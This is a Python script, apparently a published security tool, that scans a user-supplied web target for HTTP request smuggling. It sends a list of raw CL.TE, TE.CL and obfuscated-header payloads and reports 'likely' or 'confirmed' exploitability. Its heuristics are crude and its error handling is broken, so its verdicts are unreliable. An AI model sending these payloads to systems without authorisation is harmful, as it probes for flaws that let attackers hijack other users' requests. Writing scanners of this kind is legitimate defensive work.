#!/usr/bin/python3
import argparse
import socket
from urllib.parse import urlparse, parse_qs, urlencode
import ssl
import json
import os
from datetime import datetime

"""
Professional 0.CL Request Smuggling Scanner
Author: nu11secur1ty 2025
Description: Detects likely and confirmed HTTP request smuggling vulnerabilities
in POST/GET requests, including URL parameter fuzzing. Safe and non-destructive.
"""

# ------------------- Console Colors -------------------
RED = '\033[91m'
ORANGE = '\033[33m'
GREEN = '\033[92m'
RESET = '\033[0m'

# ------------------- Base Payloads -------------------
BASE_PAYLOADS = [
    ("CL-only baseline",
     "POST /{path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 11\r\nConnection: close\r\n\r\nHELLO_WORLD",
     "Baseline POST with only Content-Length"),

    ("CL.TE",
     "POST /{path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n0\r\n\r\nSMUGGL\r\n",
     "Conflicting Content-Length and Transfer-Encoding (CL.TE)"),

    ("TE.CL",
     "POST /{path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nContent-Length: 6\r\nConnection: close\r\n\r\n0\r\n\r\nSMUGGL\r\n",
     "Conflicting Transfer-Encoding then Content-Length (TE.CL)"),

    ("TE.CL (obfuscated)",
     "POST /{path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nContent-Length: 6\r\nConnection: close\r\n\r\n0 ;\r\n\r\nSMUGGL\r\n",
     "Obfuscated chunk size TE.CL"),

    ("CL.TE (extra CRLF)",
     "POST /{path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n\r\n0\r\n\r\nSMUGGL\r\n",
     "Extra CRLF before chunk"),

    ("CL.TE (tab spacings)",
     "POST /{path} HTTP/1.1\r\nHost:\t{host}\r\nContent-Length:\t6\r\nTransfer-Encoding:\tchunked\r\nConnection: close\r\n\r\n0\r\n\r\nSMUGGL\r\n",
     "Tab-spaced headers"),
]

# ------------------- Extra POST/GET Techniques -------------------
EXTRA_PAYLOADS = [
    ("GET baseline",
     "GET /{path} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n",
     "Baseline GET request"),

    ("GET TE",
     "GET /{path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n0\r\n\r\nSMUGGL\r\n",
     "GET with chunked encoding"),

    ("POST CL.TE (case mix)",
     "POST /{path} HTTP/1.1\r\nhOsT: {host}\r\nContent-Length: 6\r\nTransfer-Encoding: Chunked\r\nConnection: Close\r\n\r\n0\r\n\r\nSMUGGL\r\n",
     "Mixed-case headers"),

    ("POST CL.TE (extra CRLFs)",
     "POST /{path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n\r\n\r\n0\r\n\r\nSMUGGL\r\n",
     "Multiple CRLFs"),

    ("POST CL.TE (spaced headers)",
     "POST /{path} HTTP/1.1\r\nHost : {host}\r\nContent-Length : 6\r\nTransfer-Encoding : chunked\r\nConnection : close\r\n\r\n0\r\n\r\nSMUGGL\r\n",
     "Headers with spaces before colon"),

    ("GET CL.TE conflict",
     "GET /{path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 5\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n0\r\n\r\nSMUGGL\r\n",
     "GET request with CL/TE conflict"),
]

# Combine payloads
PAYLOADS = BASE_PAYLOADS + EXTRA_PAYLOADS

# ------------------- Socket Request Sender -------------------
def send_raw_request(host, port, raw_request, use_tls=False, timeout=5):
    import time
    start = time.time()
    try:
        if use_tls:
            context = ssl.create_default_context()
            with socket.create_connection((host, port), timeout=timeout) as sock:
                with context.wrap_socket(sock, server_hostname=host) as ssock:
                    ssock.sendall(raw_request.encode())
                    response = ssock.recv(8192)
                    elapsed = time.time() - start
                    return response.decode(errors="ignore"), elapsed
        else:
            with socket.create_connection((host, port), timeout=timeout) as sock:
                sock.sendall(raw_request.encode())
                response = sock.recv(8192)
                elapsed = time.time() - start
                return response.decode(errors="ignore"), elapsed
    except Exception as e:
        return f"Error: {e}", None

# ------------------- HTML Report -------------------
def generate_html_report(results, output_file):
    html_content = f"""
<html>
<head>
<title>0.CL Request Smuggling Scan Report</title>
<style>
body {{ font-family: Arial, sans-serif; }}
table {{ border-collapse: collapse; width: 100%; }}
th, td {{ border: 1px solid #ddd; padding: 8px; vertical-align: top; }}
th {{ background-color: #f2f2f2; }}
.likely {{ color: orange; font-weight: bold; }}
.confirmed {{ color: red; font-weight: bold; }}
.normal {{ color: green; }}
pre {{ white-space: pre-wrap; word-wrap: break-word; }}
</style>
</head>
<body>
<h2>0.CL Request Smuggling Scan Report</h2>
<p>Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
<table>
<tr><th>Payload Name</th><th>Description</th><th>Request</th><th>Response Line</th><th>Status</th><th>Response Time (s)</th></tr>
"""
    for r in results:
        status_class = 'confirmed' if r.get('confirmed_exploit') else 'likely' if r.get('likely_exploit') else 'normal'
        status_text = 'Confirmed Exploitable' if r.get('confirmed_exploit') else 'Likely Exploitable' if r.get('likely_exploit') else 'Normal'
        response_time = f"{r['response_time']:.3f}" if r.get('response_time') else "N/A"
        html_content += f"<tr><td>{r['payload']}</td><td>{r['description']}</td><td><pre>{r['request']}</pre></td><td>{r['response_line']}</td><td class='{status_class}'>{status_text}</td><td>{response_time}</td></tr>\n"
    html_content += "</table>\n</body>\n</html>"

    with open(output_file, 'w', encoding='utf-8') as f:
        f.write(html_content)
    print(f"\n✅ HTML report generated at {output_file}")

# ------------------- Smuggling Check -------------------
def check_smuggling(host, port, scheme, path='/', query=None, output_json=False):
    print(f"[*] Scanning {scheme}://{host}:{port}{path}...\n")
    results = []
    baseline_status = None
    query_str = f"?{urlencode(query)}" if query else ''
    full_path = f"{path}{query_str}"

    for name, payload, description in PAYLOADS:
        raw_request = payload.format(host=host, path=full_path)
        response, resp_time = send_raw_request(host, port, raw_request, use_tls=(scheme=='https'))
        first_line = response.split('\r\n')[0] if response else '(no response)'
        suspicious = '400' in first_line or '403' in first_line
        confirmed = 'SMUGGL' in response

        color = RED if confirmed else ORANGE if suspicious else GREEN
        print(f"--- Payload: {name} ---")
        print(f"{color}Response: {first_line} (time: {resp_time:.3f}s){RESET}")

        results.append({
            'payload': name,
            'description': description,
            'request': raw_request,
            'response_line': first_line,
            'suspicious': suspicious,
            'confirmed_exploit': confirmed,
            'likely_exploit': suspicious and not confirmed,
            'response_time': resp_time
        })

        if name == 'CL-only baseline':
            baseline_status = first_line

    # Compare responses to baseline
    print('\n--- Baseline Comparison ---')
    for r in results[1:]:
        if baseline_status and r['response_line'] != baseline_status and not r.get('confirmed_exploit'):
            r['likely_exploit'] = True
            print(f"{ORANGE}⚠️ {r['payload']} likely exploitable ({baseline_status} -> {r['response_line']}){RESET}")
        elif r.get('confirmed_exploit'):
            print(f"{RED}⚠️ {r['payload']} confirmed exploitable{RESET}")
        else:
            print(f"{GREEN}{r['payload']} response matches baseline{RESET}")

    report_file = os.path.join(os.path.dirname(os.path.realpath(__file__)), '0cl_scan_report.html')
    generate_html_report(results, report_file)

    if output_json:
        print('\n--- JSON Report ---')
        print(json.dumps(results, indent=2))

# ------------------- Target Parsing -------------------
def parse_target(target_url, port=None):
    parsed = urlparse(target_url)
    scheme = parsed.scheme if parsed.scheme else 'http'
    host = parsed.netloc if parsed.netloc else parsed.path
    path = parsed.path if parsed.path else '/'
    query = parse_qs(parsed.query) if parsed.query else None
    if not port:
        port = 443 if scheme == 'https' else 80
    return host, port, scheme, path, query

# ------------------- Main -------------------
def main():
    parser = argparse.ArgumentParser(description='Professional 0.CL Request Smuggling Scanner')
    parser.add_argument('target', help='Target URL or hostname')
    parser.add_argument('-p', '--port', type=int, help='Target port (default depends on scheme)')
    parser.add_argument('--json', action='store_true', help='Output results in JSON format')
    args = parser.parse_args()

    host, port, scheme, path, query = parse_target(args.target, args.port)
    check_smuggling(host, port, scheme, path, query=query, output_json=args.json)

if __name__ == '__main__':
    main()
